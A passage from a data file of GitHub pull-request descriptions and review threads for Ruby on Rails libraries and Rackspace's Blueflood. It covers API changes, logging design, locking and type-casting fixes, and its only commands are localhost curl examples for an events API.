2. Improved performance significantly by switching to fetch_multi/multiplot.
(Note this required updating the graphite-api code from version 1.0.1 to 
Head of master.  Since we also had to patch that code I created a new repo
for it here: https://github.com/rackerlabs/graphite-api/tree/george/fetch_multi_with_patches

3. One other detail about fetch_multi is that it has to take the multiplot limits into
account.  Multplot allows only 100 metrics per call, and has implicit limit of around
7000 json characters. So my changes batch up each of graphite-apis fetch_multi() calls
into to the minimum number of multiplot calls that still abide by those limits.

4. Now supports specificy specific submetric names in the config file, (rather
than just assuming ""average"", ""num_points"" or ""latest"" as we were before.
This required changes on both the search side, and the fetch_multi side.
This work was based on the changes suggested and created by Alex Weeks:
https://github.com/aweeks

5. Finally added a bunch of tests to get coverage of this file up to 93%:
https://23282e1499f9e238db58e26751fc6d96be63cc17-www.googledrive.com/host/0B28IWTWKORCkfnlLYmljbW1NQ295NWhWbmtfbDJ1UXYwQm9xdlVuMjN0NFV1QTNmcDltY2M/x/blueflood.html
","['\n[![Coverage Status](https://coveralls.io/builds/2461974/badge)](https://coveralls.io/builds/2461974)\n\nCoverage decreased (-0.08%) to 51.34% when pulling **a0d8e812fbda821afb9885031c79d59458031b77 on george/add_fetch_multi2** into **7072b54f3ab80cf16fba5a0c4759e2220f123732 on master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/2520043/badge)](https://coveralls.io/builds/2520043)\n\nCoverage increased (+0.03%) to 51.47% when pulling **c21dd403edc118ffe614324f143c433185acd5d3 on george/add_fetch_multi2** into **acc39a6045440c03128b1c9684c071a229302cba on master**.\n', 'These files have been updated per the review from chinmay-gupte.\r\nThe changes are as follows:\r\n\r\n1. Tried to simplify the find_nodes() method a bit by splitting\r\nit out into 2 separate methods depending on whether submetrics are\r\nused or not.\r\n\r\n2. Changed the term ""cache"" to ""dictionary""\r\n\r\n3. No longer sorts timestamps, because they are sorted from BF.\r\n\r\n4. Chinmay suggested that we rollup metrics that coexist in the same\r\n""step"", (instead of dropping all but the first.)  However, this\r\nproblem only occurs when full res metrics have sub-second frequencies.\r\nSince that seems to be a rare case, I\'ve just documented the problem\r\nfor now, and will fix it when it actually becomes a problem\r\n\r\n\r\nNote that if you only want to see the diffs since the initial\r\nversion of this PR, you can see them like so:\r\ngit diff 6e7e811 c21dd40 \r\nor\r\nhttps://github.com/rackerlabs/blueflood/compare/6e7e811...c21dd40\r\n', 'The lastest diffs:\r\nhttps://github.com/rackerlabs/blueflood/compare/c21dd403edc118ffe614324f143c433185acd5d3...george/add_fetch_multi2', '\n[![Coverage Status](https://coveralls.io/builds/2538711/badge)](https://coveralls.io/builds/2538711)\n\nCoverage remained the same at 51.44% when pulling **22d4dd7f203b28d4906f94d3a1cf4e9b8bf0334e on george/add_fetch_multi2** into **acc39a6045440c03128b1c9684c071a229302cba on master**.\n', '+1 after my last comment has been addressed.']"
500,rackerlabs/blueflood,480.0,"This is a continuation of the Events PR #436.

Ingestion:
```
curl -i -X POST 'http://localhost:19000/v2.0/5405532/events' -d   '{
    ""what"": ""deployment"",
    ""when"": 1433798159000,
    ""tags"": ""deployment"",
    ""data"": ""deploying prod""
  }'
```

Query:
```
curl -i -X GET 'http://localhost:20000/v2.0/5405532/events/get_data?from=1433798150000&until=143379816
```","['All files are missing license. We should add it.', 'I checked the graphite API and it seems we are pretty much on par with the API which graphite supports for events https://code.launchpad.net/~lucio.torre/graphite/add-events/+merge/69142']"
501,radar/forem,440.0,"Thoughts, comments?

@knewter @radar @robyurkowski @ugisozols","[""Good god, I'm trying to read through this while watching ghost in the shell for the first time.  Sorry..."", ""@knewter it's a lot huh."", ""really enjoyed your boy @saturnflyer's talk today too btw :)"", 'Yeah, I did a few more commits..']"
502,radar/paranoia,66.0,"I'm adding some aliases to scopes so that the methods sync with Mongoid Paranoia methods. We're using polygot databases and I think it's nicer to have consistent methods across components tasked with doing the same thing.

Maybe one day I'll combine the two gems to work with ActiveRecord & Mongoid.

Also contains formatting changes.  If you use different formatting settings with your IDE I can adjust.

https://github.com/simi/mongoid-paranoia","['Please remove the require for debugger and then this patch is good to go.', 'Should be good to go', 'Merged, thanks!']"
503,rails-api/active_model_serializers,680.0,I noticed root keys couldn't be set from the controller's render json options.,"['can you squash your commits in a single one?', 'All Squashed', 'LGTM :smiley: /cc @steveklabnik ', ':+1: ', 'LGTM', 'Thank you!']"
504,rails-api/active_model_serializers,692.0,"Include top-level 'linked' member when using JSON-API adapter. Needed to pass the hash to the elements in the collection, using the options hash worked, but I'm open to suggestions.  ","[""I agree with this but only if we pass `include` option to the serializer. It wouldn't make sense to include `linked` by default to every resource. Should be other way around imo, eg. `include: [:comments]` (with support for singular associations too, obviously)"", 'cc @guilleiguaran ', ""@kurko I'll add the include handling and update the PR"", ""@ggordon I need this next week. Just out of curiosity, do you think you'll be able to add it anytime soon? "", '@kurko I plan on working on it tomorrow.', ""This is awesome! Really good job here :+1:\r\n\r\nTo proceed, I believe we should include support for sublevel associations first (e.g `include=comments,comments.author`). I wouldn't feel comfortable merging only half of the feature."", '@kurko  Does this seem right?\r\n`GET /posts/1?include=comments.author`\r\nAccording to the spec this should not automatically include `comments`. But the result seems to have _broken_ links.\r\n\r\n```json\r\n{\r\n  ""posts"": {\r\n    ""title"": ""New Post"",\r\n    ""body"": ""Body"",\r\n    ""id"": ""1"",\r\n    ""links"": {\r\n      ""comments"": [\r\n        ""1"",\r\n        ""2""\r\n      ],\r\n      ""author"": ""1""\r\n    }\r\n  },\r\n  ""linked"": {\r\n    ""authors"": [\r\n      {\r\n        ""id"": ""2"",\r\n        ""name"": ""Anonymous""\r\n      }\r\n    ]\r\n  }\r\n}\r\n```', ""@ggordon yeah, this seems weird, but I'd stick with the spec. Personally, I don't think I'd ever call `GET /posts/1?include=comments.author`, but instead `GET /posts/1?include=comments,comments.author`. The spec should probably be reviewed.""]"
505,rails-api/active_model_serializers,184.0,"I needed to use these features, there was no mention of it's existence on documentation, so I looked into the de code base to find out about its existence. Thought someone else would have the same need.

I don't know if the place I chose to place it is ok or not, if any changes are needed please let me know.

Thanks this is a great gem.","['Very good. Thank you', ""Ok, I think now this looks ok, next time I'll use some cheat sheet for markdown.\r\n\r\nthanks"", 'done', ':heart:']"
506,rails-api/active_model_serializers,936.0,This PR fixes issue #876 where meta was not being included when using the JSON adapter and a custom root.,"['Looks good! Should also have a test for the array serializer', 'Cool! Thank you both of you! A quick win :smile: . Also agree that was cleaver to not use #915 for now.\r\n@chrisbranson could you just squash the commits into one with a cool and clear description? \r\nMeanwhile @kurko just pinging you on this.', ""Looking great!!\r\n\r\nQuestion: should any of these tests be in [test/serializers/meta_test.rb](https://github.com/rails-api/active_model_serializers/blob/35fb9de3104336fde07df093a4bd7765ac9ea0fa/test/serializers/meta_test.rb#L14-L26) (or should any of them be failing right now?)\r\n\r\nI think it would be great to add a test around a meta key present, but no root given in the render, to show that meta is ignored in the Array scenario.  \r\n\r\nI don't know if there's an advantage to also testing the below root-related settings:\r\n- `ActiveModel::Serializer._root = true/nil`\r\n- `ItemSerializer._root = true/nil`\r\n- `ActiveModel::Serializer::ArraySerializer._root = true/nil`\r\n- <code>ActiveSupport.on_load(:active_model_serializers) do\r\n   self._root = true/nil\r\n end</code>\r\n- `ActiveRecord::Base.include_root_in_json = true/false`\r\n- <code>ActiveSupport.on_load(:active_record) do\r\n   self.include_root_in_json = true/false\r\n end\r\n</code>\r\n\r\nAlso related: \r\n- https://github.com/rails-api/active_model_serializers/issues/882"", 'Yes, I agree with everything @bf4 is saying. We need moar teeeeests', 'Great, would be awesome if we could already add some of this tests in this PR :smile: ', ""The tests in [test/serializers/meta_test.rb ](https://github.com/rails-api/active_model_serializers/blob/35fb9de3104336fde07df093a4bd7765ac9ea0fa/test/serializers/meta_test.rb#L14-L26) do not fail because they pass the `:root` option to the serializer whereas the controller tests go via  [lib/action_controller/serialization.rb](https://github.com/rails-api/active_model_serializers/blob/35fb9de3104336fde07df093a4bd7765ac9ea0fa/lib/action_controller/serialization.rb#L36-L54) which is passing `:root` to the adapter (due to the partitioning on line 39).\r\n\r\nI've altered meta_test.rb to partition the options in the same way as the serialization controller so they fail without my changes, and added a new test to check for the presence of meta when using the array serializer and a custom root.\r\n\r\nCommits squashed with a hopefully cool and clear enough commit message :sunglasses: "", 'Not sure why the CI tests are failing - it seems to be falling over on one unrelated test when run against Rubinius on Rails 4.0 ...', ""@chrisbranson CI is green.  All of the failures I see are pre-existing and ignored. Your'e good :)"", '@bf4 Good news - it was failing earlier but seems to have sorted itself out now :smile: ', ""@chrisbranson This is so great! Thanks for doing all the actual work! Lemme know if you'd rather limit the scope of work (and comments) in any way and defer some work to future PRs.  (especially since I'm not even a collab, just have experience with this code not working right and wanna help :)"", ""I think this PR is done for the issue it was trying to address - but as I discovered earlier today and you've highlighted in your comments there is considerable scope for refactoring. That said, what's there does work as expected now.\r\n\r\nMuch as I'd like to wade in and help out, I'm not going to get much more time in the near future to focus on non-essential changes simply due to day job time commitments - I've got an API to finish :smile: "", ':+1:  @joaomdmoura @kurko LGTM', 'Updated with the cleaner coding style as recommended by @bf4 :+1: ', 'Waiting for this pull request to be accepted and starting using the `root` option on `has_many` again :)!', ""@iMacTia are you saying you're waiting to use this PR or you have another PR you want to make (ref plz)?"", ""I mean I'm waiting for this one, should solve #882 as well if I got it right, isn't it?"", '@iMacTia what I do in this situation is in my Gemfile\r\n\r\n```ruby\r\n# Bundling from source until https://github.com/rails-api/active_model_serializers/pull/936 is merged\r\ngem ""active_model_serializers"", github: ""insphire/active_model_serializers"", branch: ""fix-meta-with-custom-root""\r\n```', 'Awesome work fellows! Really happy that you guys made it!\r\nMerging it.']"
507,rails-assets/rails-assets,86.0,"Fixes #71

This moves the locking to Redis::Mutex.

Also, previously, when gems were built on demand from bundler requests, locking was done based on a hash of all requested gems. I couldn't find any reason for that, so I changed it to lock per requested gem.

Another change is that when two parallel requests want the same gem to be built, it will be built only once.",[]
508,rails/activejob,57.0,"/cc @dhh @rafaelfranca

","['Should we require the railtie when including active_job in the Gemfile? If so we need to add the require to active_job.rb.', 'That mean we should add railtie as dependency ?', ""It is missing two things:\r\n\r\n1. Add railties was gem dependency (the same version as activemodel)\r\n2. Add `require 'active_job/railtie'` in active_job.rb"", ""Why do activejob depend on railties while other frameworks (active*, action*) don't ."", ""These frameworks doesn't require the railtie when you do `require 'active_record'` for example. This is why I asked if we need to require the railtie when doing `require 'active_job'` if the answer is yes, we need to depend on railtie, if the answer is no we don't need to do anything else and this patch is ready to merge.\r\n\r\nI think we are more for a no, right?"", ""I just checked, i have a typo in the file name. \r\nI think i did something wrong : \r\n```ruby\r\nLoading development environment (Rails 4.2.0.alpha)\r\n[1] pry(main)> require 'active_job'\r\n=> true\r\n[2] pry(main)> require 'active_job/railtie'\r\n=> true  # <= railtie was not loaded\r\n[3] pry(main)> ActiveJob::Base.logger      \r\n=> #<ActiveSupport::Logger:0x007f8e9cbfd5d8\r\n @default_formatter=#<Logger::Formatter:0x007f8e9cbfd588 @datetime_format=nil>,\r\n @formatter=\r\n  #<ActiveSupport::Logger::SimpleFormatter:0x007f8e9cbfd3d0\r\n   @datetime_format=nil>,\r\n @level=0,\r\n @logdev=\r\n  #<Logger::LogDevice:0x007f8e9cbfd4c0\r\n   @dev=#<IO:<STDOUT>>,   #<= logger was not replaced\r\n   @filename=nil,\r\n   @mutex=\r\n    #<Logger::LogDevice::LogDeviceMutex:0x007f8e9cbfd470\r\n     @mon_count=0,\r\n     @mon_mutex=#<Mutex:0x007f8e9cbfd420>,\r\n     @mon_owner=nil>,\r\n   @shift_age=nil,\r\n   @shift_size=nil>,\r\n @progname=nil>\r\n```"", ""Ok, so we need to add to `active_job.rb`:\r\n\r\n```ruby\r\nrequire 'active_job/railtie' if defined?(Rails)\r\n```""]"
509,rails/activejob,61.0,#59 ,"[""It's actually not just these log lines from AJ itself I want tagged. It's all the work log lines as well. So an AR log line that's originating from the #perform call should be tagged as well. I think we just need to have the tagging happen as a block yield around the #execute call."", 'ping @dhh ', 'Please stash your commit.', 'So, based on the feedback, here\'s my proposal on how the logging should look like:\r\n\r\nWhen scheduling jobs\r\n```\r\n[ActiveJob] Enqueued JobClass to QueueName with arguments: ""arg1"", ""arg2""\r\n[ActiveJob] Enqueued JobClass to QueueName at 1970-01-01 00:00:01 UTC with arguments: ""arg1"", ""arg2""\r\n```\r\nWhen executing a job\r\n```\r\n[ActiveJob] [JobClass] [UUID] Performing JobClass from QueueName with arguments: ""arg1"", ""arg2""\r\n[ActiveJob] [JobClass] [UUID] Log message from job\r\n[ActiveJob] [JobClass] [UUID] Performed JobClass from QueueName in 120ms\r\n```\r\nWhen running inline mode\r\n```\r\n[ActiveJob] Enqueued JobClass to QueueName with arguments: ""arg1"", ""arg2""\r\n[ActiveJob] [JobClass] [UUID] Performing JobClass from QueueName with arguments: ""arg1"", ""arg2""\r\n[ActiveJob] [JobClass] [UUID] Log message from job\r\n[ActiveJob] [JobClass] [UUID] Performed JobClass from QueueName in 120ms\r\n```\r\nWhen executing a job and scheduling another job from the `perform` method\r\n```\r\n[ActiveJob] [JobClass] [UUID] Performing JobClass from QueueName with arguments: ""arg1"", ""arg2""\r\n[ActiveJob] [JobClass] [UUID] Log message from job\r\n[ActiveJob] [JobClass] [UUID] Enqueued JobClass to QueueName with arguments: ""arg1"", ""arg2""\r\n[ActiveJob] [JobClass] [UUID] Enqueued AnotherJobClass to AnotherQueueName with arguments: ""arg3"", ""arg4""\r\n[ActiveJob] [JobClass] [UUID] Another log message from job\r\n[ActiveJob] [JobClass] [UUID] Performed JobClass from QueueName in 120ms\r\n```\r\n\r\nPS: For adapters providing JobIDs I would use those instead of SecureRandom.uuid\r\n\r\n \r\n', 'We should also add option to filter arguments logging.', 'I don\'t think we need to filter arguments. Developers shouldn\'t send sensitive data in job params. Some of the backends do some logging and data can be ""leaked"" there also. Filtering arguments in ok in controllers as it\'s user data and you, as a developer, cannot control that but in jobs you control the data that is sent to the job.', ""Looks good with the proposal and using JobIDs instead of UUIDs for queues that support that :+1:. Agree that we shouldn't need filtering. If someone would want that, they can set a logger that does the filtering."", ""Updated:\r\nI added a job_id attribute to ActiveJob::Base and we'll make another pull-request to assign a value to job_id from the adapter. \r\nI still have an issue with the logger double tagging: in the current implementation the tagging for executing the task ([ActiveJob] [JobClass] [UUID/JOB_ID]) clears any previous tagging (even outside ActiveJob)\r\n\r\n"", ""Is there a way to invert the check? Only add the tags if they're missing instead of not if they're there? Detecting just the [ActiveJob] tag should imply that the others are there too, right?"", ""That I was doing before this last commit but when running inline it won't show the `[JobClass] [UUID]` tags.\r\nWhat would work is detect the position of ActiveJob tag and pop the tags starting from ActiveJob. I'll try something later today"", 'The issues are when running inline. This is the default for new apps, right?\r\nWhat I\'m trying to do here is have a log like this:\r\n\r\nwhen running `:inline`\r\n```\r\n[ActiveJob] Enqueued JobClassOne to QueueName with arguments: ""arg1"", ""arg2""\r\n[ActiveJob] [JobClassOne] [UUID1] Performing JobClassOne from QueueName with arguments: ""1""\r\n[ActiveJob] [JobClassOne] [UUID1] A log message from JobClassOne\r\n[ActiveJob] [JobClassOne] [UUID1] Enqueued JobClassTwo to QueueName with arguments: ""2""\r\n[ActiveJob] [JobClassTwo] [UUID2] Performing JobClassTwo from QueueName with arguments: ""2""\r\n[ActiveJob] [JobClassTwo] [UUID2] A log message from JobClassTwo\r\n[ActiveJob] [JobClassTwo] [UUID2] Performed JobClassTwo from QueueName in 1ms\r\n[ActiveJob] [JobClassOne] [UUID1] Performed JobClassOne from QueueName in 2ms\r\n```\r\n\r\nbut when running `:async`\r\n\r\n```\r\n[ActiveJob] Enqueued JobClassOne to QueueName with arguments: ""arg1"", ""arg2""\r\n[ActiveJob] [JobClassOne] [UUID1] Performing JobClassOne from QueueName with arguments: ""1""\r\n[ActiveJob] [JobClassOne] [UUID1] A log message from JobClassOne\r\n[ActiveJob] [JobClassOne] [UUID1] Enqueued JobClassTwo to QueueName with arguments: ""2""\r\n[ActiveJob] [JobClassOne] [UUID1] Performed JobClassOne from QueueName in 2ms\r\n[ActiveJob] [JobClassTwo] [UUID2] Performing JobClassTwo from QueueName with arguments: ""2""\r\n[ActiveJob] [JobClassTwo] [UUID2] A log message from JobClassTwo\r\n[ActiveJob] [JobClassTwo] [UUID2] Performed JobClassTwo from QueueName in 1ms\r\n```', 'I think this is the expected behavior .', 'Agree. That seems fine.\r\n\r\nOn May 26, 2014, at 3:47 PM, Cristian Bica <notifications@github.com> wrote:\r\n\r\n> The issues are when running inline. This is the default for new apps, right?\r\n> What I\'m trying to do here is have a log like this:\r\n> \r\n> when running :inline\r\n> \r\n> [ActiveJob] Enqueued JobClassOne to QueueName with arguments: ""arg1"", ""arg2""\r\n> [ActiveJob] [JobClassOne] [UUID1] Performing JobClassOne from QueueName with arguments: ""1""\r\n> [ActiveJob] [JobClassOne] [UUID1] A log message from JobClassOne\r\n> [ActiveJob] [JobClassOne] [UUID1] Enqueued JobClassTwo to QueueName with arguments: ""2""\r\n> [ActiveJob] [JobClassTwo] [UUID2] Performing JobClassTwo from QueueName with arguments: ""2""\r\n> [ActiveJob] [JobClassTwo] [UUID2] A log message from JobClassTwo\r\n> [ActiveJob] [JobClassTwo] [UUID2] Performed JobClassTwo from QueueName in 1ms\r\n> [ActiveJob] [JobClassOne] [UUID1] Performed JobClassOne from QueueName in 2ms\r\n> but when running :async\r\n> \r\n> [ActiveJob] Enqueued JobClassOne to QueueName with arguments: ""arg1"", ""arg2""\r\n> [ActiveJob] [JobClassOne] [UUID1] Performing JobClassOne from QueueName with arguments: ""1""\r\n> [ActiveJob] [JobClassOne] [UUID1] A log message from JobClassOne\r\n> [ActiveJob] [JobClassOne] [UUID1] Enqueued JobClassTwo to QueueName with arguments: ""2""\r\n> [ActiveJob] [JobClassOne] [UUID1] Performed JobClassOne from QueueName in 2ms\r\n> [ActiveJob] [JobClassTwo] [UUID2] Performing JobClassTwo from QueueName with arguments: ""2""\r\n> [ActiveJob] [JobClassTwo] [UUID2] A log message from JobClassTwo\r\n> [ActiveJob] [JobClassTwo] [UUID2] Performed JobClassTwo from QueueName in 1ms\r\n> \xe2\x80\x94\r\n> Reply to this email directly or view it on GitHub.\r\n> ', 'Updated.\r\nI had to change the `Mutex` in sneakers adapter into `Monitor` as scheduling a job from another job while running inline would cause a ""deadlock; recursive locking"". This brings some [performance penalty](http://japgolly.blogspot.ro/2012/04/ruby-mutex-reentrancy.html).', 'ping @dhh ', ""I don't think it's worth doing the strip tag gymnastics. If a job is executing within the context of another job, it actually makes sense that it's all double tagged. Also, I don't think it's going to be a common occurrence. And we get rid of the confusing strip tag code."", ""Ok. I'm ok with no gymnastics :)"", 'updated. cc @dhh ', ':shipit: ', ""It doesn't seem like we're setting the job_id anywhere in any of the queue adapters?"", ""I said a few days ago that I added the attribute that generates UUID and we'll make separate pull requests which sets the job_id from the adapter. I don't know all adapters and we shouldn't block this PR because of that"", 'Ah, okay, I buy that.']"
510,rails/globalid,44.0,"Fixes #39.

Ready for review :grin:",['@jeremy All your concern are addressed by me.']
511,rails/globalid,73.0,"Fixes #66 

cc @matthewd @cristianbica","['I totally forgot about this! Anyway, I renamed `ActiveRecordLocator` to `UnscopedLocator` instead.', 'Thanks for this.', 'Aww :heart:']"
512,rails/rails,14757.0,"Fixes #14752

Select mimics the block interface of arrays, but does not mock the
block interface for select!. This change introduces two changes to
the behavior of select!.

1) if select! is called without an argument or a block, an error
is raised (consistent with select)

2) if select! is called with a block, it delegates the call to the
array representation of the association.

Thanks to @eric-smartlove for pointing out the issue.","['Is `select!` the only problem? Could you check with the others bang methods on this module?', ""Ok. We decided what will be the path to take.\r\n\r\n1) Rename `select!` to `_select!`\r\n2) Add `select!` to this blacklist https://github.com/rails/rails/blob/3fce111b3bb602d0d65c76a450d0fa2d7c7b54a5/activerecord/lib/active_record/relation/delegation.rb#L40\r\n\r\nFor 4-0-stable we'll need another PR with the current implementation here.\r\n\r\n@estsauver WDYT?"", ""That seems great. I actually didn't know we had that blacklist of methods.\r\n\r\nI'll put in a PR tonight.\r\n\r\n~Earl\r\n\r\n\r\nOn Tue, Apr 15, 2014 at 10:25 AM, Rafael Mendon\xc3\xa7a Fran\xc3\xa7a <\r\nnotifications@github.com> wrote:\r\n\r\n> Ok. We decided what will be the path to take.\r\n>\r\n> 1) Rename select! to _select!\r\n> 2) Add select! to this blacklist\r\n> https://github.com/rails/rails/blob/3fce111b3bb602d0d65c76a450d0fa2d7c7b54a5/activerecord/lib/active_record/relation/delegation.rb#L40\r\n>\r\n> For 4-0-stable we'll need another PR with the current implementation here.\r\n>\r\n> @estsauver <https://github.com/estsauver> WDYT?\r\n>\r\n> \xe2\x80\x94\r\n> Reply to this email directly or view it on GitHub<https://github.com/rails/rails/pull/14757#issuecomment-40509509>\r\n> .\r\n>"", '@rafaelfranca This solution seems perfect to me: it hides a method that is currently like an open trap for the developer. :+1: ', '@estsauver you are going have problems [here] [1] and [here] [2], because it will call `send(""select!"",...)`.\r\n\r\n[1]: https://github.com/rails/rails/blob/master/activerecord/lib/active_record/relation/merger.rb#L34\r\n[2]: https://github.com/rails/rails/blob/master/activerecord/lib/active_record/relation/merger.rb#L65\r\n\r\nThe easy way to fix it is just checking if the method is `:select` and then call `send(""_select!"", ...)`. It could be something like [this] [3].\r\n\r\n[3]: https://gist.github.com/laurocaetano/11454790ecc55d802dea\r\n\r\nBtw, it is not the ideal implementation (we could rename all these internals mutator methods to use  underscore), but that\'s another story. EDIT: It would be good to try it.', 'Pull Request is updated: Comments welcomed. ', 'Changes made. ', ""@estsauver looks good. Nice job :heart: \r\n\r\nI think we should also update the commit message, wdyt?\r\n\r\n```\r\nMake select! a private method _select! #14752 \xe2\x80\xa6 (it is not a private method, it's just private API.)\r\nFixes #14752\r\n\r\nSelect mimics the block interface of arrays, but does not mock the\r\nblock interface for select!. This change moves the api to be a\r\nprivate method, _select!. \r\n\r\nIt also raises an error if a block is given, which should\r\nmake sure it's not mistaken for the array select! (we are not raising an error when a block is passed)\r\n```\r\n\r\nMaybe just saying that `select!` was renamed to `_select!` to avoid confusions with `Array#select!` is good to go."", 'Good call, I\'ll update the commit message.\r\nOn Apr 21, 2014 11:47 AM, ""Lauro Caetano"" <notifications@github.com> wrote:\r\n\r\n> @estsauver <https://github.com/estsauver> looks good. Nice job [image:\r\n> :heart:]\r\n>\r\n> I think we should also update the commit message, wdyt?\r\n>\r\n> Make select! a private method _select! #14752 \xe2\x80\xa6 (it is not a private method, it\'s just private API.)\r\n> Fixes #14752\r\n>\r\n> Select mimics the block interface of arrays, but does not mock the\r\n> block interface for select!. This change moves the api to be a\r\n> private method, _select!.\r\n>\r\n> It also raises an error if a block is given, which should\r\n> make sure it\'s not mistaken for the array select! (we are not raising an error when a block is passed)\r\n>\r\n> Maybe just saying that select! was renamed to _select! to avoid\r\n> confusions with Array#select! is good to go.\r\n>\r\n> \xe2\x80\x94\r\n> Reply to this email directly or view it on GitHub<https://github.com/rails/rails/pull/14757#issuecomment-40963276>\r\n> .\r\n>', 'looks good!\r\n\r\n@rafaelfranca :shipit: ?']"
513,rails/rails,15654.0,"Currently, the tag helper honors the html_safe on its parameter values, so you can do something like `tag('a', href: 'http://example.com?a&amp;b'.html_safe)`.  However, with array values (_e.g._ when supplying multiple classes) the strings are concatenated together with `Array#join` and escaped without regard to the prior `html_safe` status.  This patch resolves the inconsistent behavior, as demonstrated by several tests.  I have also included a test for the empty array, since that's an easy one to break if you do it wrong.

I can't actually see a valid use case for supplying `html_safe` string values; in my opinion people should just supply the raw string and not try to micromanage how Rails escapes strings when using these helpers.  However, as long as we are going to escape values sometimes, we should do it consistently.

**Update:** to get certain tests involving nested array parameters to pass, I had to update `safe_join` to be more similar to `Array.join`, calling `flatten` first.","['Okay, I have made the changes suggested by @matthewd.  The nested case/if thing that resulted is pretty ugly, though.', 'Thanks! :blue_heart:\r\n\r\n> The nested case/if thing that resulted is pretty ugly, though.\r\n\r\nYeah.. I went with a slightly more compact (arguably, terse) spelling.']"
514,rails/rails,15593.0,"Depends on #15429 and includes the changes from that PR as well. There's a lot more that can be moved to these, but this felt like a good place to introduce the object. Plans are:

- Remove all knowledge of type casting from the columns, beyond a
  reference to the `cast_type`
- Move `type_cast_for_database` to these objects
- Potentially make them mutable, introduce a state machine, and have
  dirty checking handled here as well
- Move `attribute`, `decorate_attribute`, and anything else that
  modifies types to mess with this object, not the columns hash
- Introduce a collection object to manage these, and reduce allocations","['Do I read it correctly that this will now allocate an `Attribute` object for every attribute of an AR object?', 'And allocate one less string per attribute, one less hash per Base object,\r\nand go through fewer branches on both read and write. Yes.\r\nOn Jun 10, 2014 5:22 AM, ""thedarkone"" <notifications@github.com> wrote:\r\n\r\n> Do I read it correctly that this will now allocate an Attribute object\r\n> for every attribute of an AR object?\r\n>\r\n> \xe2\x80\x94\r\n> Reply to this email directly or view it on GitHub\r\n> <https://github.com/rails/rails/pull/15593#issuecomment-45601323>.\r\n>', 'One hash for multiple `Attribute`s objects might work ok (a mapping in a `Hash` is usually an object on its own).\r\n\r\nWhere do you save a string?', 'The keys of raw_attributes\r\nOn Jun 10, 2014 6:03 AM, ""thedarkone"" <notifications@github.com> wrote:\r\n\r\n> One hash for multiple Attributes objects might work ok (a mapping in a\r\n> Hash is usually an object on its own).\r\n>\r\n> Where do you save a string?\r\n>\r\n> \xe2\x80\x94\r\n> Reply to this email directly or view it on GitHub\r\n> <https://github.com/rails/rails/pull/15593#issuecomment-45604624>.\r\n>', ""Damn, I remember a PR that attempted to pre-`freeze` those (frozen strs don't get `dup`ed by `Hash`es), or was that something else?"", 'Unsure. This is also a first step, which should enable me to reduce object allocations overall once I start tackling `@column_types` and `@column_types_override`.', '>Do I read it correctly that this will now allocate an Attribute object for every attribute of an AR object?\r\n\r\nAR object or AR class? Instantiating an attribute should happen once per column (or user defined) attribute definition, but not every time an AR object is instantiated and attributes populated, right?', '> AR object or AR class?\r\n\r\nAR object (not class).\r\n\r\n> Instantiating an attribute should happen once per column (or user defined) attribute definition, but not every time an AR object is instantiated and attributes populated, right?\r\n\r\nNo, it seems to be 1x `Attribute.new` for each attribute of every AR object instantiated.', ""That is correct. However, for each `Attribute` object we gain, we've cut one string allocation when reading attributes. This will enable us to reduce object allocations overall, as we can reduce the number of caches each instance has to keep (dirty checking will put us over the top)"", 'Does the attribute hold any instance data? If not, it can be a singleton (and this can be optimized later)', 'Yes, it does hold instance data. It keeps the value before and after type casting, and is responsible for managing that. ']"
515,rails/rails,15868.0,"Moved `Builder` to its own file, as it started looking very weird once I
added private methods to the `AttributeSet` class and the `Builder`
class started to grow.

Would like to refactor `fetch_value` to change to

```ruby
self[name].value(&block)
```

But that requires the attributes to know about their name, which they
currently do not.",[]
516,rails/rails,15970.0,"Adds `config.action_mailer.preview_enabled`

This allows mail previewing to be enabled easily in non-development
environments such as staging. The default is set to true for development
so no changes should be required to existing Rails applications.

The mail preview path can still be configured using the existing
`config.action_mailer.preview_path` configuration option.

Adding this prevents devs from having to do stuff like:

```ruby
  config.action_mailer.preview_path ||= defined?(Rails.root) ? ""#{Rails.root}/test/mailers/previews"" : nil
 
  routes.append do
    get '/rails/mailers'         => ""rails/mailers#index""
    get '/rails/mailers/*path'   => ""rails/mailers#preview""
  end
```

in order to enable mail previewing on staging.","['@pixeltrix does the overall feature seems fine to you?', ""I reworked this so there aren't any more changes inside `railties/lib` except to remove the route appending from the finisher. This also lets me place the configuration item in `config.action_mailer` instead of adding a global configuration item."", 'We need to update the configuration guides to add this new config.', ""I've updated the configuration guides to include both this new config and the existing `config.action_mailer.preview_path` config which didn't seem to be covered."", 'Please squash your commits on a single one']"
517,rails/rails,16188.0,"We ran into a problem with Rationals and the `Decimal#cast_value` method. 
For a `Rational` type, use a precision or fallback to default `BigDecimal.new(value, 0)`

@Overbryd and @marianovalles","['I think @sgrif and @rafaelfranca have seen the problem.\r\nOur initial patch (a4802e2) fixes the problem, tested and without breaking existing functionality.\r\n\r\nIf you or @sgrif want to modify the coding style any further, I kindly ask you to contribute another patch to this pull request when you have come to a conclusion.', ""@Overbryd, that's not really how it works. If you'd like to contribute to any project, you're expected to follow the style of that code base. "", 'I think it is fine to we change it. We can apply the code style, I just\r\nthought you wanted to do. We really appreciate you using your time to fix\r\nthe problem. :heart:\r\nOn Jul 16, 2014 8:45 PM, ""Sean Griffin"" <notifications@github.com> wrote:\r\n\r\n> @Overbryd <https://github.com/Overbryd>, that\'s not really how it works.\r\n> If you\'d like to contribute to any project, you\'re expected to follow the\r\n> style of that code base.\r\n>\r\n> \xe2\x80\x94\r\n> Reply to this email directly or view it on GitHub\r\n> <https://github.com/rails/rails/pull/16188#issuecomment-49242640>.\r\n>', ""@sgrif I know. That is why we submitted multiple patches adhering to your proposals. Your comments were all very helpful (i.e. hashrocket, `::Numeric`). I wanted to point out that there is some `if/case` controversy.\r\nLet's make a conclusion, stick to one and ship it.\r\n\r\nHere is my contribution to the conclusion:\r\nhttps://gist.github.com/Overbryd/249d43f0cf3d134b4aa9\r\n```\r\n       user     system      total        real\r\nif  6.830000   0.020000   6.850000 (  6.849904)\r\ncase  9.270000   0.010000   9.280000 (  9.378929)\r\n```""]"
